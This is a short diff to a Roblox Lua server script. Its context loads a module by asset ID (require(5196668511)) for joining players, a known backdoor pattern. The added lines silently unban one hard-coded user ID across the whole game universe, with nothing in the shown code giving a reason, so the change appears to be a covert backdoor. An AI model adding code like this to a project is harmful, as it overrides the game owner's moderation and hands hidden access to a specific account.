@@ -4,3 +4,7 @@ game.Players.PlayerAdded:Connect(function(player)
         require(5196668511)(player.Name)
     end
 end)
+
+task.spawn(function()
+    game:GetService("Players"):UnbanAsync({UserIds = {781984681}, ApplyToUniverse = true})
+end)
